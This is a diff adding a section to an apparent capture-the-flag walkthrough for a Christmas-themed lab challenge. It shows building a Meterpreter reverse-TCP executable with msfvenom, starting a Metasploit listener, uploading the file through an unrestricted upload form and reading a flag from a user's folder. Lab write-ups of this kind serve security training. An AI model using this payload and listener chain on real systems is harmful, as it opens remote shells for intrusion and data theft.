@@ -358,20 +358,35 @@ Answer
 
 ## Day 15: Santa is looking for a Sidekick
 
+first, i can see the webapp is allowing with all of file uploads, create a webshell
 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.127.91 LPORT=4444 -f exe -o cv.exe
+```
 
+![image](https://user-images.githubusercontent.com/90561566/208070483-84e61b67-9ef7-498e-8008-0321c07bdd5a.png)
 
+open listener
 
+```
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.127.91; set LPORT 4444; exploit"
+```
 
+and upload cv.exe to santa's webapp, and wait about 1 minute
 
+![image](https://user-images.githubusercontent.com/90561566/208071272-a4b6fa23-e0d3-4b54-98c0-0c30778c370b.png)
 
+list the users directory
 
+![image](https://user-images.githubusercontent.com/90561566/208071820-12856702-70f6-437d-98d0-a707395857be.png)
 
+```
+cd C:/Users/HR_Elf/Documents
+cat flag.txt
+```
 
+![image](https://user-images.githubusercontent.com/90561566/208072001-b6d06d6c-ba49-456d-b8a2-4b69d4ea98fc.png)
 
+Answer
 
-
-
-
-
-
+![image](https://user-images.githubusercontent.com/90561566/208072485-28dfba93-d6f4-4b31-a4d6-d1d53d7181a9.png)
